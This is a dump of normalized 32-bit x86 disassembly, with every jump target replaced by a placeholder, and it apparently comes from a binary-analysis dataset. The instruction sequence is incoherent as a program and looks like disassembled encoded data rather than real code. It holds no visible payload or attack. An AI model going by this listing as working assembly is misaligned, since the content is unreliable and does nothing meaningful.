jb r-xdata
jb r-xdata
push ss
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xf93a151d
and bh [ ebx + 0x212b3a15 ]
jb r-xdata
test [ ebx - 0x61 ] ch
pop esp
imul ebx [ ecx ] 0x229f6b84
or eax [ edi + 0xd ]
sbb eax 0xcc88ba1d
mov ebp 0x3b0b8788
add [ 0xffffffff8472721d ] ebx
imul esp [ edi - 0x50947be2 ] 0x14
mov ebx 0xb206a76f
imul esp [ edi - 0x50947b16 ] 0x2b850a1a
push ebx
jb r-xdata
and cl [ ebx ]
jmp 0x73288283
loope r-xdata
or bh ah
or cl ch
loope r-xdata
loop r-xdata
loop r-xdata
loop r-xdata
sbb eax 0xc4950b1d
loop r-xdata
mov dl ah
xor [ edx - 0x77443378 ] bh
test [ ebx - 0x59 ] ch
jb r-xdata
sbb esp [ ebx + 0x7272e2e2 ]
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
ror [ ebx ] 0x1
and eax 0x721d1d52
sbb eax 0x55ed721d
jb r-xdata
jb r-xdata
pop edi
sub [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
inc edi
loop r-xdata
jb r-xdata
jpe r-xdata
cli
imul esp [ esi + edx - 0x1e ] 0xffffffe2
adc cl cl
adc esp [ ecx + 0x23 ]
loopne r-xdata
jb r-xdata
fwait
imul edi [ edi - 0x451edae6 ] 0xffffffbb
mov ebx 0x33d984bb
in eax dx
sub al 0x84
cmpsd [ esi ] [ edi ]
jb r-xdata
loop r-xdata
and [ ebx + ebp * 2 - 0x7745cf59 ] al
jb r-xdata
out 0xe2 al
loop r-xdata
imul ebx [ edi - 0x5f7742d8 ] 0xffffff84
loop r-xdata
or ecx ebx
and al 0xb
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
adc al 0x1d
or bl [ eax - 0x4ee2e2ae ]
outsd
dec esi
jb r-xdata
and eax 0x918d3aa7
lea eax [ ebp - 0x3d69c159 ]
stosb [ edi ]
xchg esp eax
or edi [ ebp ]
sbb eax 0x7272721d
jb r-xdata
sub dl cl
sbb eax 0x289f6b84
mov ebp 0x6b84a088
loop r-xdata
cmp [ ebx ] cl
mov eax [ 0x72e2e2ec ]
jb r-xdata
0x34af6b84 0x88bb
add [ ebx + ebp * 2 - 0x7744c551 ] 0xffffff85
test [ ebx - 0x51 ] ch
jb r-xdata
mov bh 0x7a
test [ ebx - 0x61 ] ch
jbe r-xdata
lahf
sub [ ebp + 0x6b84a088 ] bh
mov [ 0xffffffffe2c08a0b ] al
loop r-xdata
nop
or ecx [ edi ]
push ds
loop r-xdata
loop r-xdata
sbb eax 0x7272721d
jb r-xdata
and cl [ ebx ]
push ebp
test [ ebx - 0xa ] ch
in al dx
pushfd
jb r-xdata
jb r-xdata
sbb eax 0xf7990b1d
loop r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
jb r-xdata
imul esp [ edi - 0x337745d0 ] 0xffffffbb
jb r-xdata
mov ebx 0x6b849588
or ecx [ edx + 0x72e2e2c0 ]
push eax
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
imul esp [ esi - 0x1e ] 0xffffffe2
jb r-xdata
jb r-xdata
sbb eax 0xe697272
or eax [ ecx - 0x1c ]
loop r-xdata
fstp [ esi + 0x66edf6c6 ]
mov [ esi + 0x1d ] bl
sbb eax 0x1d2eb60b
sbb eax 0x72727272
jb r-xdata
mov ah 0xea
jb r-xdata
or edx [ esi ]
0xe2e2
sbb eax 0x930bb294
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or edi [ edx + 0x12 ]
loop r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cli
or edx [ ebp + 0x11 ]
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov esp 0x1d1d5be6
jb r-xdata
xor ch [ ecx + 0x20 ]
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
scasd [ edi ]
xor [ ebx + 0x6b849688 ] bh
scasd [ edi ]
test [ ebx - 0x59 ] ch
xor al 0x69
and [ ebx ] ecx
mov ebx [ esi ]
sbb eax 0x6b84721d
scasd [ edi ]
xor bh [ ebx + 0x6b849588 ]
sbb eax 0x8872721d
jb r-xdata
mov edx 0x6b848c88
jb r-xdata
imul esp [ edx + ebp * 2 - 0x1e ] 0xffffffe2
sub bl [ fs : 0x2e2f8a1d ]
loop r-xdata
jb r-xdata
jb r-xdata
call 0x1d782d5a
outsd
cmpsd [ esi ] [ edi ]
add cl [ ebx ]
movsd [ edi ] [ esi ]
xor al 0x1d
sbb eax 0x9602a725
jb r-xdata
jne r-xdata
out 0x5b al
jb r-xdata
sbb eax 0xbf6be2e2
jb r-xdata
imul esi [ edi - 0x60947b86 ] 0x76
jb r-xdata
mul edx
mov ebp 0x360bb9bc
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
popad
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mov ah dl
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ eax ] 0x30a76b84
jb r-xdata
imul esp [ ss : ebx + ecx ] 0x1d1d1c50
mov ah cl
jb r-xdata
loop r-xdata

jb r-xdata
jb r-xdata
imul esp [ edx + esi * 2 - 0x1e ] 0xffffffe2
loop r-xdata
xchg edi eax
sbb eax 0xad69bb1d
loop r-xdata
sbb eax 0xb5727272
jecxz r-xdata
jb r-xdata
or ebx [ ebx ]
jb r-xdata
sbb eax 0x6be2e21d
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
mov ah dl
jb r-xdata
jb r-xdata
push ss
in al dx
loop r-xdata
mov ecx 0x1d1b360b
sbb eax 0xc2c6a66b
and cl [ bp + di ]
mov edx 0x6b848f88
cmpsd [ esi ] [ edi ]
mov edx 0x88b88d88
jb r-xdata
jb r-xdata
mov es si
outsb
or eax [ ebx ]
xlat
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mov ah 0x69
jb r-xdata
cmpsd [ esi ] [ edi ]
push ds
or eax [ esp + ebx * 8 - 0x1e ]
loop r-xdata
sbb eax 0xe2f7990b
imul esp [ edi - 0x4bf445c6 ] 0x19
sbb eax 0x7272721d
popad
jb r-xdata
out dx al
jb r-xdata
imul ebp [ edx + 0x52 ] 0xffffffe2
loop r-xdata
jb r-xdata
loop r-xdata
mov bl [ ebx - 0x4a89de34 ]
jb r-xdata
jb r-xdata
adc [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
test [ ebx - 0x59 ] ch
jb r-xdata
mov ebx 0x6b849b88
jb r-xdata
jb r-xdata
imul esp [ edi - 0x787745fe ] 0xb
jb r-xdata
or edi [ ecx + 0x721d1d23 ]
jb r-xdata
xchg [ edx ] ch
sbb eax 0xe5058a1d
bound edx [ edi ]
mov ch 0xb
mov ecx 0x721d1d23
xchg esi eax
sub bl [ 0x2e2f8a1d ]
loop r-xdata
jb r-xdata
stosd [ edi ]
jb r-xdata
mov [ 0x7272e2e2 ] eax
jb r-xdata
jb r-xdata
jb r-xdata
mov edi 0xbae1251a
mov ebx 0xd984bbbb
xor ebp ebp
jb r-xdata
pop ebx
loop r-xdata
imul esp [ edi - 0x23bbf4e2 ] 0xffffffe2
test [ ebx - 0x59 ] ch
cmp bh [ edx + 0x1d19b40b ]
sbb eax 0x72727272
loope r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
pop ds
sbb eax 0xf17a0a1d
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov ah dl
shl dl cl
loop r-xdata
0xe2c1
or cl [ esi - 0x5 ]
jb r-xdata
cmp eax 0x721d1d04
imul esp [ edx + ebx * 8 - 0x1d1c82f6 ] 0xffffffe2
loop r-xdata
imul ebx [ edx ] 0xe2e3dd0b
jb r-xdata
jb r-xdata
sbb ah cl
sbb ebp ebp
jb r-xdata
loop r-xdata
jb r-xdata
or ecx [ ebp + 0x72e2e2d7 ]
jb r-xdata
or dh [ ebx - 0x1d ]
sbb eax 0x751d0a97
loop r-xdata
or ah dl
jb r-xdata
push cs
jb r-xdata
jb r-xdata
imul esp [ edi + 0x2bb9bd1a ] 0x72727221
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and al 0xb5
sbb eax 0x962e2f8a
or al [ esi - 0x75e2e2d6 ]
add eax 0xb51762e5
sbb eax 0x1d0a7e0b
sbb eax 0x72727272
jb r-xdata
mov ch 0x6b
sbb eax 0xc81fda8a
jb r-xdata
loope r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov ebx 0xed33d984
and eax 0xbbbbbae1
test [ ebx - 0x59 ] ch
adc al 0x88
xchg edi eax
mov [ edi + 0x2ea76b84 ] cl
mov edx 0x88b88d88
0xe2e2de0b 0x72e2
jb r-xdata
loop r-xdata
jb r-xdata
fisubr [ ecx - 0x59 ]
jb r-xdata
jb r-xdata
imul esp [ esi + 0x2267c2c6 ] 0xb
loop r-xdata
pop edx
and ah dl
jb r-xdata
insb
jb r-xdata
sub esp [ ecx ]
jb r-xdata
xchg esi eax
jne r-xdata
jb r-xdata
neg [ 0x1e751dd4 ]
and cl [ ebx ]
jb r-xdata
cli
popad
sahf
shl al 0x5d
jb r-xdata
jb r-xdata
jb r-xdata
imul edx [ edx - 0xf3ef43e ] 0x7272e2e2
or ecx [ esi ]
mov dl [ ebx - 0x16 ]
out 0x15 al
mov ch 0x6b
movsb [ edi ] [ esi ]
mov [ 0xffffffffe2d19c0b ] al
loop r-xdata
inc esp
fsubr st2
or bl ch
jecxz r-xdata
sbb ebx [ 0xffffffffc6a66b1d ]
or esi [ esi ]
loop r-xdata
or esp [ ecx ]
mov dl 0xb
jb r-xdata
push 0x52
loop r-xdata
sub eax 0xbe2e2e7
jb r-xdata
sbb bh [ ebp + 0x72212bb9 ]
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
or ecx edx
shl edx 0xe2
jb r-xdata
jb r-xdata
mov edx 0x88bbcc88
jb r-xdata
sbb al 0x1d
imul esp [ edi + 0xb246936 ] 0x50
jb r-xdata
or eax 0x6f721d1d
jb r-xdata
mov [ edi + 0x1d11c20b ] al
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
loop r-xdata
enter 0xb570 0x6b
ficomp [ edi ]
jb r-xdata
or edx [ edx ]
pop ebx
sbb eax 0x7272721d
jb r-xdata
push ss
jb r-xdata
mov eax 0x6b849788
jb r-xdata
sbb eax 0x7272721d
imul ebx [ edi - 0x7be22ed6 ] 0x6b
sbb ah [ 0xffffffffbbbbbae1 ]
jb r-xdata
loop r-xdata
sbb eax 0xa769deb4
retn 0x2267
mov esp 0x1b360bb9
jb r-xdata
retn 0x2d0b
jb r-xdata
les eax [ ecx + 0x6bb17588 ]
jb r-xdata
loop r-xdata
jb r-xdata
or edi [ ebx + ecx ]
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0x225a691d
push es
jb r-xdata
inc edi
mov dl al
jb r-xdata
sbb eax 0x54ed96b4
loop r-xdata
jb r-xdata
and esp ebx
loop r-xdata
loop r-xdata
arpl [ eax ] dx
jb r-xdata
sbb eax 0x6bb1b21d
push edi
xor bl [ edi ]
sbb eax 0xe0950b1d
loop r-xdata
adc bl [ 0x2b67841d ]
or ebx [ eax + eax * 8 + 0x676fe2e2 ]
xor bl [ edi ]
jb r-xdata
push 0x1d12e10b
sbb eax 0xb2b6784
pushfd
shl dl 0xe2
pop ebp
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
int3
and cl [ ebx ]
pop esi
fnclex
loop r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
imul ecx [ esi ] 0xbee0e61
fimul [ edx ]
jae r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
in eax dx
jb r-xdata
jb r-xdata
mov ebp 0x72212bb9
sbb eax 0xe2e27e72
mov ah 0xde
jb r-xdata
mov [ ebp - 0x4f ] dh
jb r-xdata
sbb eax 0xc6a66b1d
dec esi
sti
int3
jb r-xdata
sbb eax 0xe6bc6f72
jb r-xdata
or eax edx
jb r-xdata
or ah [ esi + ebp ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cli
jb r-xdata
call 0xffffffffd228bcda
sub [ eax ] cl
sbb eax 0xb22671d
or ecx [ edx + 0x3b ]
sbb eax 0xc6961d1d
cli
imul esp [ edx + ecx ] 0x1d1d253c
mov ebx 0x67eead69
sub ebp ebp
jb r-xdata
sbb eax 0xe2e24e74
jb r-xdata
scasd [ edi ]
imul esp ebx 0xe11aab69
cmp eax 0x24611931
0xf7be6aa0 0xb41
jb r-xdata
push ss
sbb eax 0x1a6f6f1d
imul esp [ edi + 0xb908814 ] 0xf
push ebx
0x6bb515e6 0xa2a4
loop r-xdata
jb r-xdata
jne r-xdata
jb r-xdata
shl dl cl
mov cl 0xb
push cs
movsd [ edi ] [ esi ]
in eax dx
jb r-xdata
loop r-xdata
or ecx [ eax ]
jb r-xdata
xchg esi eax
jb r-xdata
sbb ebx [ 0x7272721d ]
sbb eax 0xfac30a1d
loop r-xdata
cmp al 0xb
loop r-xdata
sbb eax 0xe2225a69
or ebp [ 0xbe2e2e7 ]
jb r-xdata
jb r-xdata
jb r-xdata
aam 0x1d
jne r-xdata
mov eax [ 0x226784fe ]
in eax dx
mov dx 0xe2ec
loop r-xdata
push ebp
loop r-xdata
and [ ebx ] ecx
jb r-xdata
mov al 0xd0
sbb al 0x84
imul ebx [ edi - 0x3a05f4e8 ] 0xffffffe2
loop r-xdata
mov dl 0xb3
mov bl ah
loopne r-xdata
jb r-xdata
jb r-xdata
fucom st3
loop r-xdata
and cl [ bp + di ]
jb r-xdata
retn 0x646b
or esi [ ecx + ebx + 0x72721d1d ]
mov ah dl
loop r-xdata
loop r-xdata
xchg edi eax
or bl [ 0xffffffffe2e26675 ]
jle r-xdata
scasd [ edi ]
jb r-xdata
mov cl 0xb
jno r-xdata
or eax [ edi - 0x1a ]
push esp
loop r-xdata
mov ah 0x69
push edx
pop esi
sbb al 0xd4
loop r-xdata
mov al ah
or [ eax + 0x646bb175 ] 0xe2e2e20a
loop r-xdata
fucom st3
loop r-xdata
mov cl 0x6b
mov [ ebx + 0x36a76b84 ] bl
jb r-xdata
outsd
jb r-xdata
jb r-xdata
loop r-xdata
outsd
sbb eax 0xea971d1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ edx ] 0x1d4f3c0b
sbb eax 0x32a7691d
popad
and dh dh
imul esp [ edi + 0x35e60b1a ] 0x1d
sbb eax 0x72727272
imul esp [ edi + 0x72212bea ] 0x72727272
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mov ch 0x6b
imul esp [ edx + ecx ] 0x1d1d2af3
mov ebx 0x66ed2267
cmpsd [ esi ] [ edi ]
dec esi
jb r-xdata
imul esp [ edi - 0x58947bd4 ] 0x32
jb r-xdata
or eax [ ecx + 0x721d1d1e ]
mov bl 0xa
jpo r-xdata
imul ah
mov cl 0x1d
xchg esi eax
loop r-xdata
jb r-xdata
imul esp [ esi + ebx * 8 - 0x1d1c8cf6 ] 0xffffffe2
imul esp [ edx + ecx - 0x1e ] 0xffffffe2
loop r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
and cl [ ebx ]
mov cl 0xff
loop r-xdata
jb r-xdata
out 0xe2 eax
loop r-xdata
jb r-xdata
int1
jb r-xdata
loop r-xdata
loop r-xdata
sbb eax 0xd0b066ed
je r-xdata
or ah [ edi ]
jb r-xdata
scasd [ edi ]
jb r-xdata
adc ah [ edi + 0x14 ]
in eax dx
sub [ esi ] dx
sbb eax 0xf2a7691d
imul edi edx 0xffffffb1
mov ah 0xb
mov ah 0xb
sbb eax 0x1d67721d
mov al al
loop r-xdata
jb r-xdata
jb r-xdata
imul ebx [ esp + eax * 4 ] 0xb189f6b
cli
mov bl 0x88
jecxz r-xdata
jb r-xdata
or esp [ ebx + 0x10 ]
loop r-xdata
cmpsd [ esi ] [ edi ]
outsd
jb r-xdata
loop r-xdata
sbb eax 0xb772721d
or edi esi
pop ss
sbb eax 0x7272721d
jb r-xdata
sbb eax 0xbb77272
jb r-xdata
jecxz r-xdata
loop r-xdata
popad
test [ ebx - 0x59 ] ch
jb r-xdata
sbb eax 0x72727272
jb r-xdata
in eax 0xe2
loop r-xdata
imul edi [ edi + 0xea60a0e ] 0x1d
sbb eax 0x67ee2661
and ch ch
jb r-xdata
loop r-xdata
or bl [ 0x1d1d ]
sbb eax 0x6fea971d
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
out 0x35 al
jb r-xdata
pop ds
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
or ah dl
jb r-xdata
cmp [ esi ] eax
cmp [ ebp + 0x6ced1467 ] esi
adc ah dl
loop r-xdata
jb r-xdata
out 0x1d al
cmpsb [ esi ] [ edi ]
mov cl 0xb4
imul edx [ edx + 0x5e ] 0xd1e2e2e2
jb r-xdata
mov edx 0x69e2e2ec
mov ah 0x96
loop r-xdata
loop r-xdata
add dh ah
loop r-xdata
shl dl 0xe2
jb r-xdata
loop r-xdata
jb r-xdata
in eax dx
mov al 0xd0
or ebx [ 0x1d67721d ]
outsd
xor bl [ bx ]
imul esp ebx 0xffffffb1
or esi [ ecx + 0x1d ]
jb r-xdata
jb r-xdata
shl eax 0xe2
loop r-xdata
push ds
jb r-xdata
sbb [ 0xffffffffa66bbb1d ] bl
nop
jb r-xdata
inc esi
jb r-xdata
outsd
jb r-xdata
loop r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x59230b1d
sbb eax 0x7272721d
jb r-xdata
mov cl 0x1d
je r-xdata
out dx al
imul esp [ edx + esi * 4 + 0x1aa76bb2 ] 0xb216a76f
mov [ 0x1d20b60b ] bl
sbb eax 0xa2266172
mov al [ edi + 0x52 ]
stc
0xbb5
jb r-xdata
jb r-xdata
outsd
or edx [ eax + 0x9 ]
out dx al
xchg edi eax
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
add edx [ bp + di + 0x1d ]
jb r-xdata
mov ch 0xb
mov [ 0x72e2e2e4 ] al
and cl [ ebx ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jo r-xdata
jb r-xdata
outsd
jb r-xdata
imul esp [ edi - 0x7bdf96ce ] 0x6b
jb r-xdata
sbb eax 0xbc6f721d
jb r-xdata
and [ edx + 0x72 ] esi
jb r-xdata
jb r-xdata
or edi [ 0x721d1d04 ]
loop r-xdata
jb r-xdata
jb r-xdata
in eax dx
pushad
adc eax 0x55ed1d1d
jb r-xdata
jb r-xdata
and ch ch
out 0xe2 al
loop r-xdata
loop r-xdata
imul esp [ esi + ebx * 4 + 0x1d1cfa0a ] 0x1d
mov ch [ ebp - 0x4a1063e7 ]
imul esp [ esi + ecx * 8 + 0x1d1ce80a ] 0x1d
mov al [ edx ]
ffreep st3
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
fwait
jb r-xdata
jb r-xdata
mov dl ah
sbb eax 0x1df6c696
aam 0x1d
jb r-xdata
loop r-xdata
jb r-xdata
mov [ 0x1d14130b ] al
sbb eax 0x2361b172
adc cl [ edx ]
imul ecx [ eax ] 0xa1691d1d
salc
stosb [ edi ]
loopne r-xdata
jb r-xdata
outsd
jb r-xdata
imul esp [ ebx + ecx ] 0x1d1d1c50
jb r-xdata
and [ edx + 0x72 ] esi
jb r-xdata
movsd [ edi ] [ esi ]
jb r-xdata
jb r-xdata
loop r-xdata
imul edi [ edx + 0x27f30bc6 ] 0x72721d1d
jb r-xdata
outsd
jb r-xdata
jb r-xdata
jb r-xdata
fst [ ebx + 0x1d ]
imul ecx [ esi ] 0x9b70bb3
jb r-xdata
and ebp [ ecx - 0x66 ]
xchg [ esi ] ebx
push ebx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sub bl [ 0x1fda8a1d ]
and al 0xa
sub bl [ 0x2267bb1d ]
into
jb r-xdata
jb r-xdata
jb r-xdata
mov bh 0x69
jb r-xdata
or [ ebx ] bl
sbb eax 0x7272721d
loop r-xdata
jb r-xdata
or ebp [ edi + 0x72e2e2f1 ]
jb r-xdata
sbb eax 0x6f56af6f
imul esp [ edx + ecx * 8 + 0x1d1f090a ] 0x1d
mov dh [ ecx - 0x4aef1484 ]
imul esp [ esi + eax * 8 + 0x1d1f3f0a ] 0x1d
mov ah [ edi - 0x4aadb82e ]
imul esp [ esi + ebp * 8 + 0x1d1f2d0a ] 0x1d
or edx [ edi - 0x39 ]
loop r-xdata
sbb ebx [ edi ]
aam 0xb5
imul esp [ edx + ebx * 2 - 0x1e ] 0xffffffe2
loop r-xdata
sahf
jb r-xdata
sbb al 0x1d
sbb eax 0xa9ea46b
cli
jb r-xdata
imul edi [ edi - 0x1381f436 ] 0xffffffe2
jb r-xdata
jb r-xdata
jb r-xdata
mov dl 0x84
imul esi [ edi - 0x50947bfc ] 0x12
or ecx [ ebx + 0x72e2e2eb ]
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
sbb cl [ ebx ]
fsubr st2
loop r-xdata
sbb eax 0x16751dd4
and ah bh
mov [ ebx ] ebp
out 0x58 eax
sbb eax 0x84e2e2f7
imul esi esi 0xffffffd3
imul edx [ esi - 0x59db112e ] 0xffffffd2
and ecx edx
and dh [ edx - 0x4e4d4d4e ]
lodsb [ esi ]
in al dx
loop r-xdata
jb r-xdata
or edx [ eax + 0x1c ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
imul esp [ edx + ecx ] 0x1d1d1046
popad
sbb eax 0x67f62661
and ch ch
jb r-xdata
sbb eax 0x72727272
jb r-xdata
loop r-xdata
adc ax 0x1d5f
sbb eax 0xe61e9f61
or esp [ ebx ]
push ebx
mul [ es : edi + 0x22 ]
in eax dx
jb r-xdata
jb r-xdata
jne r-xdata
or bl [ esi ]
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x49 ] ch
fisubr [ ecx + 0x1c ]
or eax [ edi + 0x721d1d0c ]
jb r-xdata
and bh [ ecx + edi * 4 + 0x7272212b ]
jb r-xdata
sbb eax 0x6372721d
fidiv [ edx - 0x121d1d59 ]
push cs
mov bl 0xb
sbb eax 0x619aa269
jb r-xdata
imul ebx [ edx - 0x39459602 ] 0x1d27f30b
jb r-xdata
jb r-xdata
0xc6ba69fe 0xf30b
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
cmp cl [ ebx ]
cmp al 0x4f
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x741da5b1
sbb eax 0x7272721d
xor al 0x9
jb r-xdata
loop r-xdata
push cs
jb r-xdata
loop r-xdata
jb r-xdata
int1
jb r-xdata
mov cl 0xb4
mov ebp 0x72212bb9
jb r-xdata
jmp r-xdata
shl [ edx ] 0x1
movsb [ edi ] [ esi ]
jb r-xdata
mov ebx 0xbe0b2267
adc edx [ ebx + 0x61b1721d ]
and edx [ edx ]
or ch [ ecx + 0x8 ]
sbb eax 0xd6a1691d
outsd
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or ebx [ ebx + 0x721d1d00 ]
jb r-xdata
or al [ edx ]
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push ecx
jb r-xdata
push edx
jne r-xdata
and ch ch
popad
and esp eax
test [ ecx - 0x25 ] ah
retn 0xa50b
sbb eax 0xbc72721d
daa
jb r-xdata
sbb eax 0xf6971d1d
mov dl 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
xor dh [ edx + 0xb3e971d ]
mov [ esi ] ebp
sbb eax 0xb572721d
sahf
salc
daa
jb r-xdata
loop r-xdata
mov [ 0x1e87619a ] al
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
or ebx [ ebp + 0xe ]
in eax dx
jb r-xdata
pop es
sbb al 0x1d
sbb eax 0x72727272
and cl [ bp + di ]
jb r-xdata
jb r-xdata
in al 0xe2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or ebx [ ecx + edx * 8 + 0x7272e2e2 ]
jb r-xdata
in eax dx
jb r-xdata
sbb eax 0x72721d1d
jb r-xdata
jb r-xdata
test [ ebx - 0x41 ] ch
loop r-xdata
jb r-xdata
jb r-xdata
movsb [ edi ] [ esi ]
out dx al
or bh dl
mov ebx 0xba222d1
jb r-xdata
sub eax 0xe2cd1c0b
loop r-xdata
or ah [ edi + 0x1e ]
jb r-xdata
jb r-xdata
jl r-xdata
jb r-xdata
jb r-xdata
outsd
add [ 0x7272721d ] bl
jb r-xdata
hlt
jb r-xdata
sbb eax 0xe2887272
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
mov bh 0x9
or eax eax
sbb [ 0x7272721d ] bl
jb r-xdata
sbb eax 0x72727272
jb r-xdata
bound ebx [ bx ]
sbb eax 0xb590a1d
sbb eax 0x6a76f1d
loopne r-xdata
in eax dx
and al 0xa
inc esi
adc [ 0xffffffffe31a611d ] bl
jb r-xdata
sbb eax 0xe5d0b1d
sbb eax 0xe31a611d
jb r-xdata
sbb eax 0x1db2f697
imul esp [ edi - 0x51f44eea ] 0x24
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
xchg edi eax
push es
sbb eax 0xa76bc2b5
push ds
or eax [ esi ]
xor bl [ 0x7272721d ]
jb r-xdata
dec edx
or edx [ ebx ]
mov ah 0xb5
mov al 0x5c
jb r-xdata
sbb eax 0x6d008a1d
jb r-xdata
popad
jb r-xdata
mov edx 0x27f30bc6
jb r-xdata
mov bh 0x16
push ss
jb r-xdata
add edx [ ebx + 0x1d ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
loop r-xdata
jb r-xdata
jb r-xdata
mov [ edx + 0x699088bd ] dl
and eax 0xf6a76b84
or esi [ edi ]
shl edx 0x1
jb r-xdata
jb r-xdata
jb r-xdata
xchg edi eax
jb r-xdata
jb r-xdata
jb r-xdata
0x7e0b
jb r-xdata
imul esp [ edx + ebp * 8 + 0x1d1e310a ] 0x1d
mov bl [ edx ]
sbb eax 0x2267bb1d
in eax dx
xchg esi eax
sbb eax 0x17498a1d
lahf
fidiv [ ecx + 0x1d18ff0b ]
sbb eax 0xa727272
outsd
cmpsd [ esi ] [ edi ]
mov dl 0xb
mov ecx 0x72e2e2d6
mov edx 0x14a76b84
or ebp [ esp + ebp * 8 - 0x1e ]
push ds
mov dl 0x1d
jb r-xdata
sbb eax 0xcf418a1d
add ebp edi
mov ch 0x6b
movsb [ edi ] [ esi ]
0x90a
pop ds
adc [ ebp + 0xac6a46b ] dh
aas
pop ds
sbb eax 0xd2a78a1d
inc edi
or bh [ edx ]
pop ds
test [ ebx - 0x49 ] ch
add al 0x84
imul ebp [ edi - 0x1474f4ee ] 0xffffffe2
xchg ebp eax
test [ ebx - 0x59 ] ch
push es
jbe r-xdata
sbb eax 0xed727272
jb r-xdata
sbb eax 0xb2727272
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
pop edx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
outsd
or ecx [ edi + 0x17 ]
or ebx [ 0x6a76f1d ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
pop ds
push cs
popad
fcmovnb st2
or esp [ ebp + 0x721d1d51 ]
sbb eax 0x1d53d70b
sbb eax 0x72727272
mov cl 0x1d
xchg edi eax
sbb eax 0xe2e24675
loop r-xdata
in eax dx
fst [ bp + di + 0x1d ]
jb r-xdata
jb r-xdata
push eax
jb r-xdata
push ss
mov cl 0xb
scasb [ edi ]
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
pop edi
sbb eax 0x1e9f611d
out 0xb al
and edx [ ebx + 0x1d ]
sbb eax 0x72727272
scasd [ edi ]
mov ebx 0x130bb5ba
mov al [ eax ]
jb r-xdata
push ds
daa
or esi ebx
jb r-xdata
sbb eax 0xea971d1d
and al 0x2e
jb r-xdata
sbb eax 0x9aa2691d
jb r-xdata
loope r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
out dx al
and eax 0x69bb1d1d
lodsd [ esi ]
jb r-xdata
cmpsd [ esi ] [ edi ]
inc esi
or eax [ ebp + 0x1c ]
sbb eax 0x7272721d
in eax dx
sbb eax 0x56af6f1d
outsd
jb r-xdata
jb r-xdata
